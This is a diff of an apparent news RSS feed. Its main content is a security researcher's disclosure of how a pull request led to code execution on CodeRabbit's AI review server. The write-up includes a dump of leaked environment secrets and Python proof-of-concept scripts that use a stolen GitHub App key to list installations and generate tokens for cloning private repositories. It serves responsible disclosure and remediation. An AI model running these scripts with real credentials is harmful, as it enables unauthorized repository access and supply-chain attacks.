+  "GITHUB_APP_NAME": "coderabbitai",
+  "GITHUB_APP_PEM_FILE": "-----BEGIN RSA PRIVATE KEY-----\n(CENSORED)-\n-----END RSA PRIVATE KEY-----\n",
+  "GITHUB_CONCURRENCY": "8",
+  "GITHUB_ENV": "",
+  "GITHUB_EVENT_NAME": "",
+  "GITHUB_TOKEN": "",
+  "GITLAB_BOT_TOKEN": "(CENSORED)",
+  "GITLAB_CONCURRENCY": "8",
+  "GITLAB_WEBHOOK_SECRET": "",
+  "HOME": "/root",
+  "ISSUE_PROCESSING_BATCH_SIZE": "30",
+  "ISSUE_PROCESSING_START_DATE": "2023-06-01",
+  "JAILUSER": "jailuser",
+  "JAILUSER_HOME_PATH": "/home/jailuser",
+  "JIRA_APP_ID": "(CENSORED)",
+  "JIRA_APP_SECRET": "(CENSORED)",
+  "JIRA_CLIENT_ID": "(CENSORED)",
+  "JIRA_DEV_CLIENT_ID": "(CENSORED)",
+  "JIRA_DEV_SECRET": "(CENSORED)",
+  "JIRA_HOST": "",
+  "JIRA_PAT": "",
+  "JIRA_SECRET": "(CENSORED)",
+  "JIRA_TOKEN_URL": "https://auth.atlassian.com/oauth/token",
+  "K_CONFIGURATION": "pr-reviewer-saas",
+  "K_REVISION": "pr-reviewer-saas-(CENSORED)",
+  "K_SERVICE": "pr-reviewer-saas",
+  "LANGCHAIN_API_KEY": "(CENSORED)",
+  "LANGCHAIN_PROJECT": "default",
+  "LANGCHAIN_TRACING_SAMPLING_RATE_CR": "50",
+  "LANGCHAIN_TRACING_V2": "true",
+  "LANGUAGETOOL_API_KEY": "(CENSORED)",
+  "LANGUAGETOOL_USERNAME": "(CENSORED)",
+  "LD_LIBRARY_PATH": "/usr/local/lib:/usr/lib:/lib:/usr/libexec/swift/5.10.1/usr/lib",
+  "LINEAR_PAT": "",
+  "LLM_PROVIDER": "",
+  "LLM_TIMEOUT": "300000",
+  "LOCAL": "false",
+  "NODE_ENV": "production",
+  "NODE_VERSION": "22.9.0",
+  "NPM_CONFIG_REGISTRY": "http://(CENSORED)",
+  "OAUTH2_CLIENT_ID": "",
+  "OAUTH2_CLIENT_SECRET": "",
+  "OAUTH2_ENDPOINT": "",
+  "OPENAI_API_KEYS": "sk-proj-(CENSORED)",
+  "OPENAI_API_KEYS_FREE": "sk-proj-(CENSORED)",
+  "OPENAI_API_KEYS_OSS": "sk-proj-(CENSORED)",
+  "OPENAI_API_KEYS_PAID": "sk-proj-(CENSORED)",
+  "OPENAI_API_KEYS_TRIAL": "sk-proj-(CENSORED)",
+  "OPENAI_BASE_URL": "",
+  "OPENAI_ORG_ID": "",
+  "OPENAI_PROJECT_ID": "",
+  "PATH": "/pnpm:/usr/local/go/bin:/root/.local/bin:/swift/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+  "PINECONE_API_KEY": "(CENSORED)",
+  "PINECONE_ENVIRONMENT": "us-central1-gcp",
+  "PNPM_HOME": "/pnpm",
+  "PORT": "8080",
+  "POSTGRESQL_DATABASE": "(CENSORED)",
+  "POSTGRESQL_HOST": "(CENSORED)",
+  "POSTGRESQL_PASSWORD": "(CENSORED)",
+  "POSTGRESQL_USER": "(CENSORED)",
+  "PWD": "/inmem/21/d277c149-9d6a-4dde-88cc-03f724b50e2d/home/jailuser/git",
+  "REVIEW_EVERYTHING": "false",
+  "ROOT_COLLECTION": "",
+  "SELF_HOSTED": "",
+  "SELF_HOSTED_KNOWLEDGE_BASE": "",
+  "SELF_HOSTED_KNOWLEDGE_BASE_BRANCH": "",
+  "SENTRY_DSN": "https://(CENSORED)",
+  "SERVICE_NAME": "pr-reviewer-saas",
+  "SHLVL": "0",
+  "TELEMETRY_COLLECTOR_URL": "https://(CENSORED)",
+  "TEMP_PATH": "/inmem",
+  "TINI_VERSION": "v0.19.0",
+  "TRPC_API_BASE_URL": "https://(CENSORED)",
+  "VECTOR_COLLECTION": "",
+  "YARN_VERSION": "1.22.22",
+  "_": "/usr/local/bin/rubocop"
+}
+</pre></div>
+
+
+<p>That payload contained so many secrets that it actually took me a few minutes to grasp what we had gotten access to. The environment variables contained, notably:</p>
+
+
+
+<ul>
+<li>Anthropic API keys (free, oss, paid, trial, etc.)</li>
+
+
+
+<li>OpenAI API keys (free, oss, paid, trial, etc.)</li>
+
+
+
+<li>Aperture agent key</li>
+
+
+
+<li>Courier auth token</li>
+
+
+
+<li>Encryption password and salt</li>
+
+
+
+<li>Gitlab personal access token</li>
+
+
+
+<li>CodeRabbit GitHub App private key, app client id, app client secret, app id</li>
+
+
+
+<li>Jira secret</li>
+
+
+
+<li>Langchain/langsmith API key</li>
+
+
+
+<li>LanguageTool API key</li>
+
+
+
+<li>Pinecone API key</li>
+
+
+
+<li>PostgreSQL database host, username and password</li>
+</ul>
+
+
+
+<p>Leaking environment variables is one thing, but since we obtained remote code execution (RCE) on that server, there is even more that an attacker could have done. Indeed, they could connect to the Postgres database server on the internal network. They could perform destructive operations. They could likely obtain the source code of the CodeRabbit app itself which is potentially somewhere in the Docker container where the external tool runs.</p>
+
+
+
+<p>Before exploring the leaked environment variables further, we performed a few minimal reconnaissance operations, such as listing a few directories and reading the contents of a couple files on the production system, just to confirm the impacts. But this process was not really efficient and we were not able to quickly confirm the presence of the original source code of the CodeRabbit webapp there. However, the built application was there in the <code>/app/pr-reviewer-saas/dist</code> directory.<br>Additionally, since this was a production server, we didn’t want to do anything that could disrupt the CodeRabbit service and decided to stop there.<br>But there was more. Let’s go back to the exfiltrated environment variables.</p>
+
+
+
+<h2>Getting Read/write access to 1M repositories</h2>
+
+
+
+<p>As mentioned above, one of the environment variables was named <code>GITHUB_APP_PEM_FILE</code> and its value contained a private key. This is actually the private key of the CodeRabbit GitHub app. This private key can be used to authenticate to the GitHub REST API and act on behalf of the CodeRabbit GitHub app. Since users of CodeRabbit have granted CodeRabbit write access to their repositories, this private key gives us write access to 1 million repositories!</p>
+
+
+
+<p>Let’s go through a few operations that one can perform with this private key.</p>
+
+
+
+<h3>Listing installations of the CodeRabbit app</h3>
+
+
+
+<p>As of writing, the CodeRabbit GitHub app was installed over 80’000 times. Basically, this tells us that at least that amount of GitHub personal accounts or organizations installed CodeRabbit and use it for at least one of their repositories. But these accounts may very well have granted access to more than one repository, or even all of their repositories.</p>
+
+
+
+<p>The CodeRabbit website states that they review 1M repositories. These include GitHub repositories, but likely also repositories from other platforms that CodeRabbit supports, such as Gitlab, and on-premises git providers.</p>
+
+
+
+<p>We will see below (see Proof of concept) how one can programatically list GitHub app installations using the GitHub API.</p>
+
+
+
+<h3>Listing GitHub repositories CodeRabbit has access to</h3>
+
+
+
+<p>For a given installation, one can list the GitHub repositories to which this installation has been granted access.</p>
+
+
+
+<p>We can also see that the installation has read/write access to the code of the repository, among other permissions. For reference, this is the list of permissions the CodeRabbit app has on the repositories it has access to:</p>
+
+
+<div><pre title="">"permissions": {
+    "actions": "read",
+    "checks": "read",
+    "contents": "write",
+    "discussions": "read",
+    "issues": "write",
+    "members": "read",
+    "metadata": "read",
+    "pull_requests": "write",
+    "statuses": "write"
+  },
+</pre></div>
+
+
+<p>Note that these permissions are public information that anyone can <a href="https://api.github.com/apps/coderabbitai">see here</a>.</p>
+
+
+
+<h3>Generating an access token valid for repositories that CodeRabbit has access to</h3>
+
+
+
+<p>A GitHub API access token can be created for the CodeRabbit app installation. This access token has all the permissions listed above and can be used on all the repositories the app installation has access to. It can be used to, for example, clone the repository or push git commits to it, since we not only have read access but also write access to the <code>contents</code>. This can also be used to update GitHub releases, including the downloadable files (the assets), and replace them with malware and therefore serve malware directly from the targeted official GitHub repository.</p>
+
+
+
+<p>The access token is valid for at most 10 minutes, but since we have the private key, more access tokens can be generated at any time, even if they expire.</p>
+
+
+
+<h3>Cloning private repositories CodeRabbit has access to</h3>
+
+
+
+<p>But this gets even scarier. Generated access tokens can also be used to clone private repositories (!) that the user has granted CodeRabbit access to. Indeed, as long as the user has granted CodeRabbit access to a repository, the private key can be used to access it. It doesn’t matter if it’s public or private.<br>Therefore, a malicious person could exploit the vulnerability to leak the CodeRabbit GitHub app private key, list all the installations, list each repository, generate an access token for each repository, and clone private repositories, serve malware from public repositories or manipulate the git history of a repository. This could be used to perform lateral movement and potentially leak GitHub repository secrets of the GitHub repository through GitHub actions if the targeted repository contains vulnerable GitHub actions.</p>
+
+
+
+<h2>Proof of concept</h2>
+
+
+
+<p>Here’s an example of how this can be achieved using the PyGitHub Python library, assuming that the private key is stored in a file called <code>priv.pem</code> and that we have the app ID and client ID (also leaked from the environment variables):</p>
+
+
+<div><pre title="">#!/usr/bin/env python3  
+import json  
+import time  
+
+import jwt  
+import requests  
+from github import Auth, GithubIntegration  
+
+with open("priv.pem", "r") as f:  
+    signing_key = f.read()  
+
+app_id = "TODO_insert_app_id_here"  
+client_id = "Iv1.TODO_insert_client_id_here"  
+
+
+def gen_jwt():  
+    payload = {  
+        # Issued at time  
+        'iat': int(time.time() - 60),  
+        # JWT expiration time (10 minutes maximum)  
+        'exp': int(time.time()) + 600 - 60,  
+        # GitHub App's client ID  
+        'iss': client_id  
+    }  
+
+    # Create JWT  
+    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
+    return encoded_jwt  
+
+
+def create_access_token(install_id, jwt):  
+    response = requests.post(  
+        f"https://api.github.com/app/installations/{install_id}/access_tokens",  
+        headers={  
+            "Accept": "application/vnd.github+json",  
+            "Authorization": f"Bearer {jwt}",  
+            "X-GitHub-Api-Version": "2022-11-28",  
+        }  
+    )  
+    j = response.json()  
+    access_token = j["token"]  
+    return access_token  
+
+
+def auth():  
+    auth = Auth.AppAuth(app_id, signing_key)  
+    gi = GithubIntegration(auth=auth)  
+    app = gi.get_app()  
+
+    # iterate through app installations, get the first 5  
+    for installation in gi.get_installations().reversed[:5]:  
+        install_id = installation.id  
+
+    # or access an installation by its ID directly  
+    installation = gi.get_app_installation(install_id)  
+
+    jwt = gen_jwt()  
+    create_access_token(install_id, jwt)  
+
+    # get all github repositories this installation has access to  
+    repos = installation.get_repos()  
+    for repo in repos:  
+        full_name = repo.full_name  
+        stars = repo.stargazers_count  
+        html_url = repo.html_url  
+        is_private_repo = repo.private  
+        clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
+        print(clone_url)  
+
+        # repo can be cloned with "git clone {clone_url}"  
+        # access token is valid for 10 minutes, but a new one can be generated whenever needed  
+
+if __name__ == "__main__":  
+    auth()
+</pre></div>
+
+
+<p>Obviously, iterating through the list of all GitHub installations of the CodeRabbit app would have required making thousands of requests to the GitHub API on behalf of the production CodeRabbit GitHub app and this may have exceeded the API quota. We didn’t want to risk disrupting the production CodeRabbit service so we only iterated through a couple installations to confirm the PoC was working.</p>
+
+
+
+<h2>Leaking CodeRabbit’s private repositories</h2>
+
+
+
+<p>We mentioned earlier that we couldn’t confirm the presence of the original source code of CodeRabbit on the production Docker container. Well, since CodeRabbit eats their own dog food, they run CodeRabbit on their own GitHub repositories. We can therefore easily retrieve the app installation ID for their GitHub organization and list the repositories this app installation has access to.</p>
+
+
+
+<p>This is the list of private repositories the coderabbitai GitHub organization has granted CodeRabbit access to:</p>
+
+
+
+<ul>
+<li><a href="https://github.com/coderabbitai/mono" rel="nofollow">https://github.com/coderabbitai/mono</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/pr-reviewer-saas" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-saas</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/e2e-reviewer" rel="nofollow">https://github.com/coderabbitai/e2e-reviewer</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/pr-reviewer-client" rel="nofollow">https://github.com/coderabbitai/pr-reviewer-client</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/db-client" rel="nofollow">https://github.com/coderabbitai/db-client</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/rabbits-lab" rel="nofollow">https://github.com/coderabbitai/rabbits-lab</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/website" rel="nofollow">https://github.com/coderabbitai/website</a></li>
+
+
+
+<li><a href="https://github.com/coderabbitai/hubspot-reporting" rel="nofollow">https://github.com/coderabbitai/hubspot-reporting</a></li>
+</ul>
+
+
+
+<p>To go further, one can generate an access token (as explained above) and clone these private repositories, including what looks like their monorepo (<code>coderabbitai/mono</code>) or the <code>coderabbitai/pr-reviewer-saas</code> repository.</p>
+
+
+
+<p>Here’s the PoC to do this. Note that it’s similar to the above, except that we directly retrieve the app installation for a specific GitHub organization by its name, instead of iterating through all the installations:</p>
+
+
+<div><pre title="">#!/usr/bin/env python3  
+import time  
+
+import jwt  
+import requests  
+from github import Auth, GithubIntegration  
+
+with open("priv.pem", "r") as f:  
+    signing_key = f.read()  
+
+app_id = "CENSORED"  
+client_id = "CENSORED"  
+
+
+def gen_jwt():  
+    payload = {  
+        # Issued at time  
+        'iat': int(time.time() - 60),  
+        # JWT expiration time (10 minutes maximum)  
+        'exp': int(time.time()) + 600 - 60,  
+        # GitHub App's client ID  
+        'iss': client_id  
+    }  
+
+    # Create JWT  
+    encoded_jwt = jwt.encode(payload, signing_key, algorithm="RS256")  
+    return encoded_jwt  
+
+
+def auth():  
+    auth = Auth.AppAuth(app_id, signing_key)  
+    gi = GithubIntegration(auth=auth)  
+
+    # Target a specific Github organization that uses CodeRabbit  
+    org = "coderabbitai"    
+    installation = gi.get_org_installation(org)  
+
+    # Target a specific Github user that uses CodeRabbit
+    # user = "amietn"  
+    # installation = gi.get_user_installation(user)  
+
+    print(installation.id)  
+    gen_token = True  
+
+    if gen_token:  
+        jwt = gen_jwt()  
+        response = requests.post(  
+            f"https://api.github.com/app/installations/{installation.id}/access_tokens",  
+            headers={  
+                "Accept": "application/vnd.github+json",  
+                "Authorization": f"Bearer {jwt}",  
+                "X-GitHub-Api-Version": "2022-11-28",  
+            }  
+        )  
+        j = response.json()  
+        access_token = j["token"]  
+
+    repos = installation.get_repos()  
+    print("---repos---")  
+    for repo in repos:  
+        full_name = repo.full_name  
+        html_url = repo.html_url  
+        private = repo.private  
+        if private:  
+            print(f"* {full_name} ({private=}) - {html_url}")  
+
+            if gen_token:  
+                clone_url = f"https://x-access-token:{access_token}@github.com/{full_name}.git"  
+                print(clone_url)  
+
+
+if __name__ == "__main__":  
+    auth()
+</pre></div>
+
+
+<p>In a similar way, a malicious person could target not only a specific GitHub organization but also a specific GitHub personal account that uses CodeRabbit and access their private repositories and/or modify them.</p>
+
+
+
+<p>As you can see, one can directly obtain the app installation ID for an organization or a user. So, this way there is no need to iterate through all the GitHub app installations to find a specific GitHub user or organization. Only the organization or user’s name is required.</p>
+
+
+
+<h2>Impacts summary</h2>
+
+
+
+<p>Let’s take a moment to summarize the impacts of getting write access to these 1 million repositories. A malicious person could have performed the following operations on affected repositories:</p>
+
+
+
+<ul>
+<li>Access private GitHub repositories nobody was ever supposed to access. This is a privacy breach.</li>
+
+
+
+<li>Modify the git history of affected GitHub repositories – Note that this can be a supply chain attack since GitHub repositories are often the source for building software before it’s distributed</li>
+
+
+
+<li>Modify existing GitHub releases and replace or add malicious downloadable files – Supply chain attack</li>
+
+
+
+<li>Further lateral moves to potentially leak GitHub repository secrets by exploiting existing vulnerable GitHub actions by pushing git commits – Note that since the CodeRabbit GitHub app doesn’t have write permission to workflows, GitHub actions can’t be directly modified. However, a vulnerable GitHub action may be exploited more easily with write access to the git repository. See the talk I gave at 38C3 for more details on how we found an instance where this was exploitable.</li>
+</ul>
+
+
+
+<p>Additionally, we obtained RCE on the CodeRabbit production system. A malicious person could have performed destructive operations, caused a denial of service, or performed malicious operations on third party systems (see list of leaked secrets above).</p>
+
+
+
+<h2>Context is key</h2>
+
+
+
+<p>While running the exploit, CodeRabbit would still review our pull request and post a comment on the GitHub PR saying that it detected a critical security risk, yet the application would happily execute our code because it wouldn’t understand that this was actually running on their production system.</p>
+
+
+
+<figure><a href="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png"><img data-attachment-id="20121" data-permalink="https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/coderabbit-review/" data-orig-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png" data-orig-size="1983,1224" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coderabbit-review" data-image-description="" data-image-caption="" data-medium-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=300" data-large-file="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=840" loading="lazy" width="1024" height="632" src="https://research.kudelskisecurity.com/wp-content/uploads/2025/02/coderabbit-review.png?w=1024" alt=""></a><figcaption>CodeRabbit’s code review of the exfiltration PoC PR</figcaption></figure>
+
+
+
+<h2>Remediation</h2>
+
+
+
+<p>CodeRabbit supports running dozens of external tools. These tools may get updates and new tools may be supported. Both cases may open the door to new ways of running arbitrary code. Therefore, trying to prevent arbitrary code execution through these tools sounds like an impossible task.</p>
+
+
+
+<p>Instead, it would be best to assume that the user may be able to run untrusted code through these tools. So, running them in an isolated environment, with only the minimum information required to run the tools themselves, and not passing them any environment variables would be much better. Even if arbitrary code execution would be possible, the impact would be much less severe.</p>
+
+
+
+<p>For defense in depth, one should add a mechanism that prevents sending private information to an attacker-controlled server. For example, only allow outgoing traffic to whitelisted hosts, if possible. If the tool doesn’t require internet access, then all network traffic may even be disabled in that isolated environment. This way it would make it harder for an attacker to exfiltrate secrets.</p>
+
+
+
+<h2>Responsible disclosure</h2>
+
+
+
+<p>After responsibly disclosing this critical vulnerability to the CodeRabbit team, we learned from them that they had an isolation mechanism in place, but Rubocop somehow was not running inside it. The CodeRabbit team was extremely responsive and acknowledged receipt of the disclosure the same day. They immediately disabled Rubocop and rotated the secrets and started working on a fix. The next week they told us that the vulnerability had been fixed. Kudos to the CodeRabbit team for responding promptly and fixing the issue.</p>
+
+
+
+<p>Here is a summary of the disclosure timeline:</p>
+
+
+
+<ul>
+<li>January 24, 2025:
+<ul>
+<li>Disclose vulnerability to CodeRabbit</li>
+
+
+
+<li>CodeRabbit acknowledges vulnerability and confirms they are working on a fix</li>
+</ul>
+</li>
+
+
+
+<li>January 30, 2025:
+<ul>
+<li>CodeRabbit confirms fix</li>
+</ul>
+</li>
+</ul>
+
+
+
+<h2>Conclusions</h2>
+
+
+
+<p>In the end, we only provided PoCs and didn’t take things further. A patient attacker could have enumerated the available access, identified the highest value targets, and then attacked those targets to distribute malware to countless others in a larger supply chain attack. Security is hard, and a variety of factors can come together to create security issues. Being quick to respond and remediate, as the CodeRabbit team was, is a critical part of addressing vulnerabilities in modern, fast-moving environments. Other vendors we contacted never responded at all, and their products are still vulnerable.</p>
+
+
+
+<p>In the race to bring AI-powered products to market, many companies prioritize speed over security. While rapid innovation is exciting, overlooking security can have catastrophic consequences, as we’ve seen. The solution isn’t to stop but to build security into the development process from day one. By making security a core priority, AI companies can create products that are not only groundbreaking but also resilient and responsible. After all, true innovation isn’t just about moving fast. It’s about building something resilient and safe for users.</p>
+
+		
+	</div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Chrome intends to remove XSLT from the HTML spec (246 pts)]]></title>
             <link>https://github.com/whatwg/html/pull/11563</link>
             <guid>44952185</guid>
             <pubDate>Tue, 19 Aug 2025 14:48:54 GMT</pubDate>
@@ -43,7 +952,7 @@
       </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Without the Futex, It's Futile (142 pts)]]></title>
+            <title><![CDATA[Without the Futex, It's Futile (161 pts)]]></title>
             <link>https://h4x0r.org/futex/</link>
             <guid>44951563</guid>
             <pubDate>Tue, 19 Aug 2025 13:53:42 GMT</pubDate>
@@ -499,7 +1408,7 @@
 </span></span></code></pre></div><p>The idea being, we’re going to combine the two lists by copying the contents of the <code>items</code> list onto the end of the <code>dst</code> list.</p><p>Now, we clearly want to grab a write lock on <code>dst</code>. And for <code>items</code>, we definitely want a read lock on that one.</p><p>But, what if we were given that API, and wanted to double a list, by doing:</p><p>I’ve seen APIs like this, where the same item is routinely passed through a nested set of construction operations that can mix reading and mutation. So you might need reads to nest, you might need writes to nest, all for the same item, in the same chain of calls.</p><p>We’d have no problems building an API that could handle such things in a program without concurrency, as long as we anticipate the need and fix the number of items to copy in before we start.</p><p>But in a multi-threaded app, if we don’t allow nested locks, we now also have to anticipate <em>every</em> situation where it might make sense for a list to be passed multiple times, and then add code to explicitly test for it.</p><p>So it’d be great to have solid semantics for RW lock nesting. But unfortunately, the POSIX standard leaves recursive locking as undefined behavior, which means that even if a conformant library provides such recursion, you definitely should not use it.</p><p>And in practice, behavior across common implementations is not remotely consistent. There’s a good reason why this was left undefined – it’s kind of hard. Since multiple threads can hold a lock, each thread must have a separate read nesting level.</p><p>And then how do you deal with writes that might be intermingled in there? How do you keep the accounting correct, so that you don’t drop write access too early, for instance?</p><p>These problems are solvable, though (and at some point soon, I’ll share my RW lock).</p><p>But in <em>The Art Of Multiprocessor Programming</em>, I can’t find any mention of such issues, neither warning you about the semantic challenges that can surprise you, nor showing how such things might be dealt with.</p><p>It’s not a surprise, since they don’t even mention the futex. Nor do they seem to cover async runtimes, despite their popularity (perhaps a bit more excusable since they’re generally multiplexing a single thread, but it still feels too important not to cover well).</p><h2 id="rtfc">RTFC</h2><p>The full source code is available <a href="https://codeberg.org/crashoverride/mutex">on codeberg</a>.</p><h2 id="-in-conclusion-">🏁 In conclusion 🏁</h2><p>I have plenty of other problems with this book, but they’d each probably need their own rant, and I’m not going to spend the time. But in short, this isn’t a Computer Science textbook, so much as it is a <em>history book</em>.</p><p>To other CS academics writing textbooks today, whether you’re focused on theory or practice, please make sure you at least <em>acknowledge</em> the important concepts that were around when you were <strong>writing the book!</strong></p><p>And ideally, make sure you cover some content from the current millennium.</p><p>If the only significant thing indicating the book was written (or edited) recently is the copyright date, consider that you might be doing a disservice with your book.</p><p>kthxbai,</p><p>Lee T, expert waiter 💁🏻‍♂️ (with the finest threads 🧵)</p></div></article></main></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[UK drops demand for backdoor into Apple encryption (239 pts)]]></title>
+            <title><![CDATA[UK drops demand for backdoor into Apple encryption (247 pts)]]></title>
             <link>https://www.theverge.com/news/761240/uk-apple-us-encryption-back-door-demands-dropped</link>
             <guid>44950600</guid>
             <pubDate>Tue, 19 Aug 2025 11:58:34 GMT</pubDate>
@@ -507,7 +1416,7 @@
 <div id="readability-page-1" class="page"><div><div><p><a href="https://www.theverge.com/authors/jess-weatherbed"><img alt="Jess Weatherbed" data-chromatic="ignore" loading="lazy" width="36" height="36" decoding="async" data-nimg="1" srcset="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=48 1x, https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96 2x" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/author_profile_images/195820/JESSICA_WEATHERBED.0.jpg?quality=90&amp;strip=all&amp;crop=0%2C0%2C100%2C100&amp;w=96"></a></p><div><p><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span id="follow-author-standard_article_details-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span></span><span>Jess Weatherbed</span></span></span></p> <p><span>is a news writer focused on creative industries, computing, and internet culture. Jess started her career at TechRadar, covering news and hardware reviews.</span></p></div></div><div id="zephr-anchor"><p>The United Kingdom will no longer force Apple to provide backdoor access to secure user data protected by the company’s iCloud encryption service, according to US Director of National Intelligence Tulsi Gabbard.</p><p>“Over the past few months, I’ve been working closely with our partners in the UK, alongside @POTUS and @VP, to ensure Americans’ private data remains private and our Constitutional rights and civil liberties are protected,” <a href="https://x.com/DNIGabbard/status/1957623737232007638">Gabbard posted to X on Monday</a>. “As a result, the UK has agreed to drop its mandate for Apple to provide a ‘back door’ that would have enabled access to the protected encrypted data of American citizens and encroached on our civil liberties.”</p><p>This announcement follows the UK <a href="https://www.theverge.com/news/608145/apple-uk-icloud-encrypted-backups-spying-snoopers-charter">issuing a secret order</a> in January this year, demanding Apple provide it with backdoor access to encrypted files uploaded by users worldwide. In response, Apple pulled the ability for new users in the UK to sign up to its <a href="https://www.theverge.com/news/617273/apple-removes-encryption-advanced-data-protection-adp-uk-spying-backdoor">Advanced Data Protection</a> (ADP) encrypted iCloud storage offering, and challenged the order, winning the right to publicly discuss the case in April. Earlier this year, US officials started examining whether the UK order had violated the bilateral CLOUD Act agreement, which bars the UK and US from issuing demands for each other’s data.</p><p>This pressure from the US <a href="https://www.theverge.com/news/710504/uk-apple-encryption-back-door-icloud-adp-backing-down">sparked reports last month</a> that Britain would walk back the demands it issued to Apple, with one unnamed UK official telling the <em>Financial Times</em> that the UK “had its back against the wall,” and was looking for a way out. While it’s unclear if the UK would negotiate new terms with Apple that avoid implicating the data of US citizens, an unnamed US official told <a href="https://www.ft.com/content/ab0aba27-81e0-4ee5-bcbb-6bce85386e40"><em>The Financial Times</em></a> that such negotiations would not be faithful to the new agreement.</p><p>With the order now reportedly removed, it’s unclear if Apple will restore access to its ADP service in the UK. We have reached out to Apple for comment. The UK Home Office has refused to comment on the situation.</p><div><p><span><strong>Follow topics and authors</strong> from this story to see more like this in your personalized homepage feed and to receive email updates.</span></p><ul><li id="follow-author-article_footer-dmcyOmF1dGhvclByb2ZpbGU6OTU="><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span><span>Jess Weatherbed</span></span></span></li><li></li><li></li><li></li><li></li><li></li></ul></div></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Custom telescope mount using harmonic drives and ESP32 (205 pts)]]></title>
+            <title><![CDATA[Custom telescope mount using harmonic drives and ESP32 (213 pts)]]></title>
             <link>https://www.svendewaerhert.com/blog/telescope-mount/</link>
             <guid>44949895</guid>
             <pubDate>Tue, 19 Aug 2025 09:46:27 GMT</pubDate>
@@ -597,7 +1506,7 @@
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Google is killing the open web (131 pts)]]></title>
+            <title><![CDATA[Google is killing the open web (143 pts)]]></title>
             <link>https://wok.oblomov.eu/tecnologia/google-killing-open-web/</link>
             <guid>44949857</guid>
             <pubDate>Tue, 19 Aug 2025 09:38:48 GMT</pubDate>
@@ -1349,7 +2258,7 @@ or if you prefer: the question isn't whether or not XML and XSLT are worth savin
 </article></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[BBC witnesses settlers attack on Palestinian farm in West Bank (107 pts)]]></title>
+            <title><![CDATA[BBC witnesses settlers attack on Palestinian farm in West Bank (112 pts)]]></title>
             <link>https://www.bbc.com/news/articles/cewy88jle0eo</link>
             <guid>44949264</guid>
             <pubDate>Tue, 19 Aug 2025 07:50:59 GMT</pubDate>
@@ -1357,7 +2266,7 @@ or if you prefer: the question isn't whether or not XML and XSLT are worth savin
 <div id="readability-page-1" class="page"><article><div data-testid="byline-new" data-component="byline-block"><p><span>Lucy Williamson</span></p><p><span>BBC News, Der Abu Falah, in the occupied West Bank</span></p></div><p data-component="caption-block"><figcaption>The BBC's Lucy Williamson witnessed an attack by masked settlers</figcaption></p><div data-component="text-block"><p>From among the broken remains of Brahim Hamaiel's olive trees, in the occupied West Bank, we saw the masked men approach.</p><p>A dozen settlers, charging down from the illegal outpost above his farm and across the field towards us, moving fast and carrying large sticks.</p><p>A sudden and unprovoked attack.</p><p>Brahim had been showing us the trees he said had been hacked to pieces this week by settlers from the outpost.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250814-092707-b0ec5bc3fc-web-2.27.1-1/grey-placeholder.png" aria-label="image unavailable"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/e3fa/live/5a7eb660-7c10-11f0-ab3e-bd52082cd0ae.jpg.webp 